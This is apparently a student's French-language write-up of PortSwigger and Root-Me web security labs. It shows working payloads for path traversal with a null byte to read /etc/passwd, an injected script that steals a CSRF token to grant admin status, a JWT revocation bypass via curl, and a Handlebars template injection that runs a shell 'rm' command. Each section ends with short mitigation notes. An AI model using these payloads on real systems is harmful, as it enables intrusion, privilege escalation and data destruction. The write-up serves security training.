# Sécurité web Challenges

## 1. File path traversal, validation of file extension with null byte bypass

### Lien:

https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

Le titre indique une faille liée au null byte, et le contenu montre que la vulnérabilité est aussi au niveau du chemin des images.

Donc j'intercepte le chargement des images avec Burp.

### Requête de base :

```
GET /image?filename=38.jpg
```

En testant, je remarque que je peux modifier le paramètre filename et ajouter un path traversal.
Je tente :

```
../../../../../../../etc/passwd%00.jpg
```

Le %00 correspond au null byte, ce qui permet de stopper la lecture réelle du nom de fichier après /etc/passwd, tout en gardant .jpg pour passer la validation.

### Payload :

```
GET /image?filename=../../../../../../../etc/passwd%00.jpg
```

![screenshot preuve](images/chall1.png "Path traversal")

### Pour sécurisé :

- Éviter d'utiliser directement la valeur fournie par l'utilisateur dans une fonction
-



## 3. CSRF - contournement de jeton

### Lien:

https://www.root-me.org/fr/Challenges/Web-Client/CSRF-contournement-de-jeton

Le but du challenge est d'acceder à la page private qui est seulement disponible pour un utilisateur admin, on a un formulaire profile avec un checkbox status, on suppose que si c'est check on est admin. On a un formulaire contact dont il ne filtre pas les script , alors on peut injecter un script avec le formulaire de changement de profile.


### Payload :

```
const xhr = new XMLHttpRequest();
xhr.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false); 
xhr.send(); 
const response = xhr.responseText 

const token = response.match(/[abcdef0123456789]{32}/g)[0]
<form name="e" id="profile" action="?action=profile" method="post" enctype="multipart/form-data">
			<div>
			<label>Username:</label>
			<input id="username" type="text" name="username" value="test">
			</div>
			<br>		
			<div>
			<label>Status:</label>
			<input id="status" type="checkbox" name="status" checked>
			</div>
			<br>
			<input id="token" type="hidden" name="token" value=`${token}`>
			<button type="submit">Submit</button>
</form>
document.getElementById('profile').submit()
```



![screenshot preuve](images/chall3.png "contournement de jeton")

### Pour sécurisé :
-Validation du Jeton (Côté Serveur)
-filtrer les formulaire


## 6. JWT - Jeton révoqué

### Lien:

https://www.root-me.org/fr/Challenges/Web-Serveur/JWT-Jeton-revoque

Dans l'énoncer, il nous a donné les endpoint POST : /web-serveur/ch63/login, GET : /web-serveur/ch63/admin et le code source du server, on a pu récupérer les information: de l'admin et l'algorime du système de blacklist


### Requête pour se connecter :

```
curl -X POST -H "Content-Type: application/json" -d '{"username":"admin","password":"admin"}' http://challenge01.root-me.org/web-serveur/ch63/login

```
### Retour de la commande:

```
{"access_token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ3NjcxMTQsIm5iZiI6MTc2NDc2NzExNCwianRpIjoiNjE5OGI5MGMtYWQ1ZS00ODVjLTlmYTYtZWQ1NzgwM2RhMGZjIiwiZXhwIjoxNzY0NzY3Mjk0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fP0unthtQzz_0NV-UxQZ4AuTZMuK5jm4sSKThcftmZ8"}

```


### Requête Payload :

```
curl -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3NjQ3NjcxMTQsIm5iZiI6MTc2NDc2NzExNCwianRpIjoiNjE5OGI5MGMtYWQ1ZS00ODVjLTlmYTYtZWQ1NzgwM2RhMGZjIiwiZXhwIjoxNzY0NzY3Mjk0LCJpZGVudGl0eSI6ImFkbWluIiwiZnJlc2giOmZhbHNlLCJ0eXBlIjoiYWNjZXNzIn0.fP0unthtQzz_0NV-UxQZ4AuTZMuK5jm4sSKThcftmZ8= " http://challenge01.root-me.org/web-serveur/ch63/admin
```

![screenshot preuve](images/chall6.png "Jeton revoque")

### Pour sécurisé :

- Éviter d'utiliser un système de blacklist mieux prévilligier le whiteliste






## 10. Lab: Server-side template injection in an unknown language with a documented exploit

### Lien:

https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit

La piste était de cliquer sur les produit. lorsqu'on produit n'est pas disponible l'url nous donne url /?message=Unfortunately%20this%20product%20is%20out%20of%20stock. Ici on a une entré vulnérable , on cherche sur payloadallthethings dans la mtehodologie il nous donne ${{<%[%'"}}%\. Grâce à ca on a pu derterminer que le moteur de template etait du handlebar. on cherche sur google Handlebars server-side template injection , on trouve ce script 
```
wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
{{/with}}

```
on encode_url le code puis on passe dans l'url 

![screenshot preuve](images/chall10.png "Server-side template injection")

### Pour sécurisé :
-Tests de Sécurité (Fuzzing) : Intégrer des tests automatisés qui injectent des chaînes de fuzzing (comme ${{<%[%'"}}%) dans tous les paramètres d'entrée, pour s'assurer qu'aucune erreur de compilation ou d'exécution de template n'est renvoyée.
-ne pas mettre de message d'erreur dans l'url
